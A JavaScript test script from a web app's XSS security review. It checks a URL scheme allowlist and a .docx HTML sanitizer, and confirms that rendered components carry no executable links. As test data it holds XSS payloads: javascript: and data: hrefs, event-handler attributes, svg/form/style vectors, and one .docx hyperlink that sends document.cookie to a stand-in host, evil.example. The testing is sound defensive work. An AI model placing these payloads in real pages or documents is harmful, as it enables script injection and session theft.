// JSDOM_DIR=<dir with jsdom installed> node docs/review/xss_m1m2_test.mjs
// (jsdom, DOMPurify's reference DOM — NOT happy-dom: under happy-dom DOMPurify 3.4.17 drops <a> wholesale but keeps
// onerror and mis-parses attributes, so a pass or fail there says nothing about a browser. Test tooling only.)
// No network, no DB. Security review M-1 / M-2 (stored XSS through user content), client-only:
//   1. safeHref — the one scheme allowlist (http / https / mailto / tel): javascript:, data:, vbscript:, file:, blob:, sms:
//      and the parser-evasion spellings are rejected; real links (and a bare host → https://) pass
//   2. sanitizeDocxHtml — crafted payloads (javascript:/data: hrefs, every on* handler, script / iframe / svg / form /
//      style) are neutralized; a normal document (headings, tables, an https link, an embedded data:image, an in-doc
//      anchor) survives intact
//   3. a REAL .docx built here with javascript: / data: hyperlinks: raw mammoth output CARRIES them (the hole is real),
//      the sanitized output does not
//   4. rendered, from the REAL bundled src/App.jsx: DocViewer shows the malicious .docx with no executable href and no
//      handler attribute; ResourceActions and the Donate link render no link for javascript:/data: and an intact link
//      for https://
//   5. the pin: every dangerouslySetInnerHTML / href={…} / window.open( in src is found and classified — user-supplied
//      ones route through safeHref; anything unclassified FAILS. DOMPurify pinned exactly; verified 132/32/14; Notify held;
//      only the expected files changed vs origin/main
import { mkdtempSync, readFileSync, existsSync, readdirSync } from "fs";
import { tmpdir } from "os";
import { join } from "path";
import { createRequire } from "module";
import { execSync } from "child_process";
import { pathToFileURL, fileURLToPath } from "url";
import { build } from "esbuild";
const ok = (name, cond, extra = "") => { console.log(cond ? "PASS" : "FAIL", name, extra); if (!cond) process.exitCode = 1; };

const root = fileURLToPath(new URL("../../", import.meta.url));
const req = createRequire(join(root, "package.json"));
const jdReq = createRequire(join(process.env.JSDOM_DIR || root, "package.json"));
const { JSDOM } = jdReq("jsdom");
const win = new JSDOM("<!doctype html><html><body></body></html>", { url: "https://app.test/", pretendToBeVisual: true }).window;
for (const k of ["window", "document", "navigator", "HTMLElement", "Node", "Event", "MouseEvent", "KeyboardEvent", "getComputedStyle", "requestAnimationFrame", "cancelAnimationFrame", "localStorage", "DOMParser", "Element", "NodeFilter", "HTMLTemplateElement", "DocumentFragment", "NamedNodeMap", "HTMLFormElement", "Text", "Comment"]) {
  try { globalThis[k] = k === "window" ? win : win[k]; } catch { /* read-only in this node */ }
}
win.HTMLElement.prototype.scrollIntoView = () => {};
globalThis.IS_REACT_ACT_ENVIRONMENT = true;

const { safeHref, SAFE_HREF_SCHEMES } = await import(pathToFileURL(join(root, "src/safeHref.js")).href);
const { sanitizeDocxHtml } = await import(pathToFileURL(join(root, "src/safeHtml.js")).href);

// ---------------------------------------------------------------- 1. safeHref
ok("safeHref: the allowlist is exactly http / https / mailto / tel", JSON.stringify(SAFE_HREF_SCHEMES) === JSON.stringify(["http:", "https:", "mailto:", "tel:"]));
const BAD = ["javascript:alert(document.domain)", "JaVaScRiPt:alert(1)", "  javascript:alert(1)", "java\tscript:alert(1)", "java\nscript:alert(1)", "\u0001javascript:alert(1)",
  "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "DATA:text/html,<script>alert(1)</script>", "vbscript:msgbox(1)", "file:///etc/passwd", "blob:https://app.test/x",
  "sms:+15551234567", "about:blank", "//evil.example/x", "/relative/path", "not a url", "", null, undefined];
const badLeaks = BAD.filter((u) => safeHref(u) !== null);
ok("safeHref: javascript: / data: / vbscript: / file: / blob: / sms: / about: / protocol-relative / relative / junk → null (incl. case, whitespace, tab, newline, control-char spellings)", badLeaks.length === 0, JSON.stringify(badLeaks));
const GOOD = [["https://988lifeline.org", "https://988lifeline.org/"], ["http://example.org/a?b=1#c", "http://example.org/a?b=1#c"], ["mailto:help@example.org", "mailto:help@example.org"],
  ["tel:+18002738255", "tel:+18002738255"], ["  https://example.org/give  ", "https://example.org/give"], ["www.firehero.org", "https://www.firehero.org/"], ["firehero.org/resources", "https://firehero.org/resources"]];
const goodMiss = GOOD.filter(([i, o]) => safeHref(i) !== o);
ok("safeHref: real links pass, returned as the PARSED href (what is checked is what is rendered); a bare host reads as https://", goodMiss.length === 0, JSON.stringify(goodMiss.map(([i]) => [i, safeHref(i)])));

// ---------------------------------------------------------------- 2. sanitizeDocxHtml on crafted payloads
const parse = (html) => { const d = document.createElement("div"); d.innerHTML = html; return d; };
const handlerAttrs = (el) => [...el.querySelectorAll("*")].flatMap((n) => [...n.attributes].filter((a) => /^on/i.test(a.name)).map((a) => `${n.tagName}.${a.name}`));
const badHrefs = (el) => [...el.querySelectorAll("[href], [src], [action], [formaction]")].flatMap((n) => ["href", "src", "action", "formaction"].map((a) => n.getAttribute(a)).filter((v) => v != null))
  .filter((v) => /^\s*(javascript|vbscript|data:(?!image\/(png|jpe?g|gif|webp);base64,))/i.test(v.replace(/[\u0000-\u001F\s]/g, "")));
const PAYLOAD = `
  <p><a href="javascript:alert(document.domain)">js</a> <a href=" JaVaScRiPt:alert(1)">js2</a> <a href="java&#x09;script:alert(1)">js3</a></p>
  <p><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">data</a> <a href="vbscript:x">vb</a></p>
  <img src="x" onerror="alert(1)"><p onclick="alert(1)" onmouseover="alert(1)">hover</p><a href="https://ok.example" onfocus="alert(1)">ok-with-handler</a>
  <script>alert(1)</script><iframe src="javascript:alert(1)"></iframe><object data="javascript:alert(1)"></object><embed src="x.swf">
  <svg><a xlink:href="javascript:alert(1)"><text>svg</text></a><script>alert(1)</script></svg><math><mi xlink:href="javascript:alert(1)">m</mi></math>
  <form action="javascript:alert(1)"><button formaction="javascript:alert(1)">b</button><input onfocus="alert(1)" autofocus></form>
  <style>body{background:url(javascript:alert(1))}</style><p style="background:url(javascript:alert(1))">styled</p><base href="javascript:alert(1)//">`;
const clean = sanitizeDocxHtml(PAYLOAD, win);
const c = parse(clean);
ok("sanitize: no event-handler attribute survives (onerror / onclick / onmouseover / onfocus …)", handlerAttrs(c).length === 0, JSON.stringify(handlerAttrs(c)));
ok("sanitize: no javascript: / vbscript: / data: (non-image) URL survives in href / src / action / formaction", badHrefs(c).length === 0 && !/javascript|vbscript|data:text/i.test(clean), JSON.stringify(badHrefs(c)));
ok("sanitize: script / iframe / object / embed / svg / math / form / button / input / style / base are gone, and no style attribute",
  !c.querySelector("script, iframe, object, embed, svg, math, form, button, input, style, base, [style]"), clean.replace(/\s+/g, " ").slice(0, 200));
ok("sanitize: the text of a neutralized link stays readable (link removed, words kept)", /js2/.test(c.textContent) && /data/.test(c.textContent) && /hover/.test(c.textContent));
const okA = [...c.querySelectorAll("a")].find((a) => a.textContent === "ok-with-handler");
ok("sanitize: the https link on the same line survives, handler stripped, opens in a new tab with noopener", okA?.getAttribute("href") === "https://ok.example/" && okA.getAttribute("target") === "_blank" && okA.getAttribute("rel") === "noopener noreferrer" && !okA.hasAttribute("onfocus"));
const IMG = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";
const NORMAL = `<h1>Station SOP</h1><p>Normal <strong>bold</strong> and <em>italic</em>.</p><ul><li>One</li><li>Two</li></ul>
  <table><tr><th>Unit</th><th>Crew</th></tr><tr><td>E1</td><td>3</td></tr></table>
  <p><a href="https://www.co.hood.tx.us/">County</a> · <a href="mailto:chief@example.org">Chief</a> · <a href="#_Toc1">Jump</a> · <a id="_Toc1"></a></p><p><img src="${IMG}" alt="map"></p>`;
const n = parse(sanitizeDocxHtml(NORMAL, win));
ok("sanitize: a normal document renders intact — heading, emphasis, list, table, https + mailto links, in-doc anchor, embedded data:image",
  n.querySelector("h1")?.textContent === "Station SOP" && n.querySelector("strong") && n.querySelector("em") && n.querySelectorAll("li").length === 2 && n.querySelectorAll("td").length === 2
  && n.querySelector('a[href="https://www.co.hood.tx.us/"]') && n.querySelector('a[href="mailto:chief@example.org"]') && n.querySelector('a[href="#_Toc1"]') && n.querySelector("img")?.getAttribute("src") === IMG,
  n.innerHTML.slice(0, 160));
ok("sanitize: fails CLOSED with no DOM (\"\" → the viewer's Download fallback)", sanitizeDocxHtml("<p>x</p>", null) === "");

// ---------------------------------------------------------------- 3. a REAL malicious .docx through mammoth
const JSZip = req("jszip");
const mammoth = req("mammoth");
async function makeDocx() {
  const z = new JSZip();
  z.file("[Content_Types].xml", `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>`);
  z.file("_rels/.rels", `<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>`);
  const H = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink";
  z.file("word/_rels/document.xml.rels", `<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rJ" Type="${H}" Target="javascript:alert(document.domain)" TargetMode="External"/>
    <Relationship Id="rJ2" Type="${H}" Target="JaVaScRiPt:fetch('//evil.example/?c='+document.cookie)" TargetMode="External"/>
    <Relationship Id="rD" Type="${H}" Target="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" TargetMode="External"/>
    <Relationship Id="rH" Type="${H}" Target="https://www.co.hood.tx.us/" TargetMode="External"/></Relationships>`);
  const p = (inner) => `<w:p>${inner}</w:p>`, r = (t) => `<w:r><w:t xml:space="preserve">${t}</w:t></w:r>`, link = (id, t) => p(`<w:hyperlink r:id="${id}">${r(t)}</w:hyperlink>`);
  z.file("word/document.xml", `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><w:body>
    ${p(r("Station SOP — read before shift."))}${link("rJ", "Open the roster")}${link("rJ2", "Policy update")}${link("rD", "Attachment")}${link("rH", "County site")}
    <w:tbl><w:tr><w:tc>${p(r("E1"))}</w:tc><w:tc>${p(r("3 crew"))}</w:tc></w:tr></w:tbl></w:body></w:document>`);
  return z.generateAsync({ type: "nodebuffer" });
}
const DOCX = await makeDocx();
const raw = (await mammoth.convertToHtml({ buffer: DOCX })).value;
ok("real .docx: RAW mammoth output carries the javascript: and data: hrefs (the hole M-1 describes is real)", /href="javascript:alert/.test(raw) && /href="JaVaScRiPt:/.test(raw) && /href="data:text\/html/.test(raw), raw.slice(0, 200));
const fixed = sanitizeDocxHtml(raw, win), f = parse(fixed);
ok("real .docx: sanitized output has no javascript: / data: href and no handler; the link text is kept", badHrefs(f).length === 0 && !/javascript|data:text/i.test(fixed) && handlerAttrs(f).length === 0 && /Open the roster/.test(f.textContent) && /Attachment/.test(f.textContent));
ok("real .docx: the normal parts survive — paragraph, the https link (new tab, noopener), the table", /Station SOP/.test(f.textContent) && f.querySelector('a[href="https://www.co.hood.tx.us/"][target="_blank"][rel="noopener noreferrer"]') && f.querySelectorAll("td").length === 2);

// ---------------------------------------------------------------- 4. rendered from the REAL bundled App.jsx
const MOCKS = {
  sb: `
    function q(table) {
      const b = { _t: table };
      for (const m of ["select", "eq", "neq", "in", "is", "order", "limit", "gte", "lte", "not", "maybeSingle", "single", "insert", "update", "delete", "upsert"]) b[m] = () => b;
      b.then = (res, rej) => Promise.resolve(globalThis.__table(table)).then(res, rej);
      return b;
    }
    export const supabase = { from: q, rpc: () => ({ then: (res) => Promise.resolve({ data: null, error: null }).then(res) }),
      storage: { from: () => ({ createSignedUrl: async () => ({ data: null, error: null }) }) },
      channel: () => ({ on() { return this; }, subscribe() { return this; } }), removeChannel() {} };
    export const APP_URL = "https://app.test", APP_ORIGIN = "https://app.test";
    export const setOnSessionExpired = () => {}; export const writesInFlight = () => 0;`,
  cd: `export const confirmDestructive = async () => true; export const setDeleteGateRole = () => {}; export const useCanDeleteShared = () => true; export const DestructiveConfirmHost = () => null;`,
  nd: `export const noirConfirm = async () => true; export const noirPrompt = async () => null; export const NoirDialogHost = () => null;`,
  api: `export const isNative = () => false; export const apiUrl = (p) => p; export async function authedFetch() { return { ok: false, status: 503, text: async () => "" }; }`,
};
const out = join(mkdtempSync(join(tmpdir(), "b4c-xss-")), "app.under-test.mjs");
await build({
  entryPoints: [join(root, "src/App.jsx")], bundle: true, format: "esm", platform: "node", outfile: out, jsx: "automatic", logLevel: "silent",
  banner: { js: 'import { createRequire as __cr } from "module"; const require = __cr(import.meta.url);' },
  loader: { ".js": "jsx", ".png": "dataurl", ".svg": "dataurl", ".jpg": "dataurl", ".css": "empty" },
  define: { "import.meta.env": JSON.stringify({ VITE_SUPABASE_URL: "https://x.test", VITE_SUPABASE_ANON_KEY: "x", MODE: "test", DEV: false, PROD: true }) },
  plugins: [{ name: "fakes", setup(b) {
    b.onResolve({ filter: /\?(url|raw)$/ }, (a) => ({ path: a.path, namespace: "vite-asset" }));
    b.onLoad({ filter: /.*/, namespace: "vite-asset" }, () => ({ contents: 'export default "";', loader: "js" }));
    b.onResolve({ filter: /supabaseClient(\.js)?$/ }, () => ({ path: "sb", namespace: "fake" }));
    b.onResolve({ filter: /ConfirmDestructive(\.jsx)?$/ }, () => ({ path: "cd", namespace: "fake" }));
    b.onResolve({ filter: /NoirDialogs(\.jsx)?$/ }, () => ({ path: "nd", namespace: "fake" }));
    b.onResolve({ filter: /^\.\/apiBase(\.js)?$/ }, () => ({ path: "api", namespace: "fake" }));
    b.onLoad({ filter: /.*/, namespace: "fake" }, (a) => ({ contents: MOCKS[a.path], loader: "js" }));
    b.onLoad({ filter: /src[\\/]App\.jsx$/ }, (a) => ({ contents: readFileSync(a.path, "utf8") + `\nexport { DocViewer, ResourceActions, DonationFunds };\nexport { createRoot } from "react-dom/client";\nexport { act } from "react";\nexport { default as React } from "react";`, loader: "jsx" }));
  } }],
});
const { DocViewer, ResourceActions, DonationFunds, createRoot, act, React } = await import(pathToFileURL(out).href);
const tick = () => act(async () => { await new Promise((r) => setTimeout(r, 0)); });
let rootR;
async function render(el) {
  document.body.innerHTML = ""; const host = document.createElement("div"); document.body.appendChild(host); rootR = createRoot(host);
  await act(async () => { rootR.render(el); }); for (let i = 0; i < 6; i++) await tick();
  return document.body;
}
const unmount = () => act(async () => { rootR.unmount(); });

// DocViewer with the malicious .docx
globalThis.fetch = async () => ({ ok: true, status: 200, headers: { get: (h) => (/content-type/i.test(h) ? "application/vnd.openxmlformats-officedocument.wordprocessingml.document" : null) },
  arrayBuffer: async () => DOCX.buffer.slice(DOCX.byteOffset, DOCX.byteOffset + DOCX.byteLength) });
{ const body = await render(React.createElement(DocViewer, { url: "https://x.test/storage/v1/object/sign/docs/sop.docx?token=t", name: "SOP.docx", path: "d/sop.docx", onClose: () => {} }));
  for (let i = 0; i < 20 && !body.querySelector(".docx-view"); i++) await tick();
  const view = body.querySelector(".docx-view");
  ok("DocViewer: the malicious .docx renders (text visible)", !!view && /Station SOP/.test(view.textContent) && /Open the roster/.test(view.textContent), view ? "" : body.textContent.slice(0, 160));
  ok("DocViewer: inside the rendered document no executable href and no handler attribute", !!view && badHrefs(view).length === 0 && handlerAttrs(view).length === 0 && !/javascript|data:text/i.test(view.innerHTML));
  ok("DocViewer: the document's https link is intact (new tab, noopener)", !!view?.querySelector('a[href="https://www.co.hood.tx.us/"][target="_blank"][rel="noopener noreferrer"]'));
  await unmount(); }

// ResourceActions
const anchors = (el) => [...el.querySelectorAll("a")].map((a) => a.getAttribute("href"));
for (const [label, website, email] of [["javascript:", "javascript:alert(document.domain)", "x@example.org"], ["data:", "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", null], ["tab-split javascript:", "java\tscript:alert(1)", null]]) {
  const body = await render(React.createElement(ResourceActions, { r: { name: "Bad", website, email, phone: "(817) 555-0100" } }));
  const hs = anchors(body);
  ok(`ResourceActions (${label} website): no Website link is rendered, no executable href anywhere; Call still works`, !hs.some((h) => !safeHref(h) && !/^sms:/.test(h)) && !body.querySelector('[aria-label="Website"], a[title="Website"]') && !/Website/.test(body.textContent) && hs.includes("tel:8175550100"), JSON.stringify(hs));
  await unmount();
}
{ const body = await render(React.createElement(ResourceActions, { r: { name: "988", website: "https://988lifeline.org", email: "help@example.org", text_number: "988", address: "1 Main St, Granbury TX" } }));
  const hs = anchors(body);
  ok("ResourceActions (normal): Website https link, Email mailto, Text sms, Directions maps — all intact", hs.includes("https://988lifeline.org/") && hs.includes("mailto:help@example.org") && hs.includes("sms:988") && hs.some((h) => /^https:\/\/maps\.(apple|google)\.com\/\?q=1%20Main%20St%2C%20Granbury%20TX$/.test(h)), JSON.stringify(hs));
  const web = [...body.querySelectorAll("a")].find((a) => a.getAttribute("href") === "https://988lifeline.org/");
  ok("ResourceActions (normal): the website opens in a new tab with noopener", web?.getAttribute("target") === "_blank" && /noopener/.test(web?.getAttribute("rel") || ""));
  await unmount(); }

// DonationFunds' Donate link
const CAMPS = [
  { id: "c1", name: "Engine fund", status: "active", goal_amount: 1000, external_url: "javascript:alert(document.domain)", sort: 1, created_at: "2026-10-01" },
  { id: "c2", name: "Turnout gear", status: "active", goal_amount: 1000, external_url: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", sort: 2, created_at: "2026-10-02" },
  { id: "c3", name: "Rescue boat", status: "active", goal_amount: 1000, external_url: "https://give.example.org/boat", sort: 3, created_at: "2026-10-03" },
];
globalThis.__table = (t) => (t === "donation_campaigns" ? { data: CAMPS, error: null } : { data: [], error: null });
{ const body = await render(React.createElement(DonationFunds, { S: new Proxy({}, { get: () => ({}) }), notify: () => {}, meId: "m1", members: [] }));
  const hs = anchors(body);
  const donates = [...body.querySelectorAll("a")].filter((a) => /Donate page/.test(a.textContent)).map((a) => a.getAttribute("href"));
  ok("DonationFunds: all three campaigns rendered", ["Engine fund", "Turnout gear", "Rescue boat"].every((x) => body.textContent.includes(x)), body.textContent.slice(0, 120));
  ok("DonationFunds: javascript: and data: campaigns render NO Donate link; the https one renders exactly its link", JSON.stringify(donates) === JSON.stringify(["https://give.example.org/boat"]) && !hs.some((h) => h && !safeHref(h)), JSON.stringify(donates));
  await unmount(); }

// ---------------------------------------------------------------- 5. the pin: every render site found and classified
const SRC = readFileSync(join(root, "src/App.jsx"), "utf8");
const srcFiles = readdirSync(join(root, "src")).filter((x) => /\.(jsx?|mjs)$/.test(x) && !/\.test\./.test(x));
const grab = (text, opener) => {   // every `opener{ … }` expression, brace-balanced (template literals carry ${…})
  const outE = []; let i = 0;
  while ((i = text.indexOf(opener, i)) !== -1) { let d = 0, j = i + opener.length - 1; for (; j < text.length; j++) { if (text[j] === "{") d++; else if (text[j] === "}" && --d === 0) break; } outE.push(text.slice(i + opener.length, j).trim()); i = j; }
  return outE;
};
const lineOf = (text, idx) => text.slice(0, idx).split("\n").length;
const sites = { dsih: [], href: [], open: [] };
for (const file of srcFiles) {
  const t = readFileSync(join(root, "src", file), "utf8");
  for (const [k, re] of [["dsih", /dangerouslySetInnerHTML=\{/g], ["href", /href=\{/g], ["open", /window\.open\(/g]]) for (const m of t.matchAll(re)) sites[k].push(`${file}:${lineOf(t, m.index)}`);
}
console.log(`   found: dangerouslySetInnerHTML ${sites.dsih.join(", ")} · href={ ${sites.href.length} sites · window.open( ${sites.open.join(", ")}`);
ok("pin: exactly one dangerouslySetInnerHTML in src (the DocViewer docx view), fed only by state set from sanitizeDocxHtml",
  sites.dsih.length === 1 && /dangerouslySetInnerHTML=\{\{ __html: html \}\}/.test(SRC) && (SRC.match(/\bsetHtml\(/g) || []).length === 1 && /const safe = sanitizeDocxHtml\(value\);\s*\n\s*if \(safe && safe\.trim\(\)\) \{ setHtml\(safe\);/.test(SRC)
  && /import\("\.\/safeHtml\.js"\)/.test(SRC));
const CLASS = [   // [expression pattern, why it is safe]
  [/^href$/, "a param: ResourceActions' labelBtn/iconBtn (every b(…) call pinned below) or the LEGAL constants"],
  [/^`(tel|sms):\$\{telDigits\([\w.]+\)\}`$/, "app-built: fixed scheme, digits-only payload"],
  [/^`mailto:\$\{SUPPORT_EMAIL\}`$/, "constant"],
  [/^GEOFENCE_DISCLOSURE\.policy\.href$/, "constant https literal"],
  [/^url$/, "DocViewer: a Supabase signed URL (every caller pinned below)"],
  [/^donate$/, "safeHref(c.external_url)"],
];
const hrefExprs = grab(SRC, "href={");
const unclassified = hrefExprs.filter((e) => !CLASS.some(([re]) => re.test(e)));
ok(`pin: all ${hrefExprs.length} href={…} sites in App.jsx are classified (none unknown)`, unclassified.length === 0 && sites.href.every((s) => s.startsWith("App.jsx:")), JSON.stringify(unclassified));
const bCalls = [...SRC.matchAll(/\{\s*([\w.]+)\s*&&\s*b\(([^,]+),/g)].map((m) => `${m[1]}→${m[2].trim()}`);
ok("pin: ResourceActions' links — website and email go through safeHref, tel/sms are telDigits, Directions is mapsHref (fixed https)",
  JSON.stringify(bCalls) === JSON.stringify(["r.phone→`tel:${telDigits(r.phone)}`", "r.text_number→`sms:${telDigits(r.text_number)}`", "r.address→mapsHref(r.address)", "web→web", "mail→mail"])
  && /const web = safeHref\(r\.website\);/.test(SRC) && /const mail = r\.email \? safeHref\(`mailto:\$\{r\.email\}`\) : null;/.test(SRC), JSON.stringify(bCalls));
ok("pin: the Donate link is safeHref(c.external_url); no stored URL field reaches an href raw",
  /const donate = safeHref\(c\.external_url\);/.test(SRC) && !/href=\{\s*(r|c|row|item|res|campaign)\.[\w.]+\s*\}/.test(SRC) && !/b\(r\.website/.test(SRC) && !/\bhref:\s*(r|c)\.\w+/.test(SRC));
ok("pin: LEGAL and GEOFENCE_DISCLOSURE hrefs are https literals", [...SRC.matchAll(/\{ label: "[^"]+", href: "([^"]+)"/g)].every((m) => /^https:\/\/b4thecall\.com\//.test(m[1])) && /policy: \{ label: "[^"]+", href: "https:\/\/b4thecall\.com\//.test(SRC));
const viewerUrls = [...SRC.matchAll(/set(?:Viewer|ViewerDoc|Proof|ViewerProof)\(\{ url: ([^,]+),/g)].map((m) => m[1]);
ok(`pin: every DocViewer url (${viewerUrls.length} callers) is a Supabase signed URL`, viewerUrls.length === 5 && viewerUrls.every((u) => u === "data.signedUrl"), JSON.stringify(viewerUrls));
const opens = grab(SRC, "window.open(".replace("(", "{")).length, openArgs = [...SRC.matchAll(/window\.open\(([^)]*)\)/g)].map((m) => m[1]);
ok("pin: window.open( — exactly the print shell's blank window and a signed URL; none takes a user-supplied URL",
  JSON.stringify(openArgs) === JSON.stringify(['"", "_blank"', 'data.signedUrl, "_blank", "noopener"']) && sites.open.every((s) => s.startsWith("App.jsx:")), JSON.stringify(openArgs));
ok("pin: the other src files render no href={ / dangerouslySetInnerHTML / window.open( (share.js's a.href is its own blob: object URL)",
  [...sites.dsih, ...sites.href, ...sites.open].every((s) => s.startsWith("App.jsx:")) && /a\.href = url; a\.download = name;/.test(readFileSync(join(root, "src/share.js"), "utf8")) && /URL\.createObjectURL\(blob\)/.test(readFileSync(join(root, "src/share.js"), "utf8")));

// pins: dependency, fences
const pkg = JSON.parse(readFileSync(join(root, "package.json"), "utf8"));
const lock = JSON.parse(readFileSync(join(root, "package-lock.json"), "utf8"));
ok("pin: DOMPurify pinned EXACTLY (no ^ / ~), lockfile + node_modules agree on 3.4.17", pkg.dependencies.dompurify === "3.4.17" && lock.packages["node_modules/dompurify"]?.version === "3.4.17" && JSON.parse(readFileSync(join(root, "node_modules/dompurify/package.json"), "utf8")).version === "3.4.17");
ok("pin: DOMPurify is bundled from node_modules (no CDN script) and imported only by src/safeHtml.js",
  !/cdnjs|jsdelivr|unpkg/.test(SRC) && srcFiles.filter((x) => /from "dompurify"/.test(readFileSync(join(root, "src", x), "utf8"))).join() === "safeHtml.js");
const vcount = (p) => (readFileSync(join(root, p), "utf8").match(/verified/gi) || []).length;
ok("verified untouched: App.jsx 132 · digest 32 · assistant 14", vcount("src/App.jsx") === 132 && vcount("api/digest.js") === 32 && vcount("api/assistant.js") === 14, `${vcount("src/App.jsx")}/${vcount("api/digest.js")}/${vcount("api/assistant.js")}`);
ok("Notify held: api/notify-session.js absent", !existsSync(join(root, "api/notify-session.js")));
// Pinned to the reviewed range (released as industrial-noir-42): base 84a698c .. reviewed 273eb67 — "vs origin/main" would go red once merged.
const changed = execSync("git diff --name-only 84a698c 273eb67", { cwd: root }).toString().trim().split("\n").filter(Boolean);
const allowed = (p) => ["src/App.jsx", "src/safeHref.js", "src/safeHtml.js", "package.json", "package-lock.json"].includes(p) || /^docs\/review\/xss_m1m2/.test(p) || /^claude\/B4C_XSS_M1M2/.test(p);
ok("only the expected files changed in the reviewed range 84a698c..273eb67 (App.jsx, the two helpers, package.json/lock, this test, the review record) — no DB, no api/", changed.every(allowed), JSON.stringify(changed.filter((p) => !allowed(p))));
process.exit(process.exitCode || 0);   // the DOM's timers would otherwise keep node alive
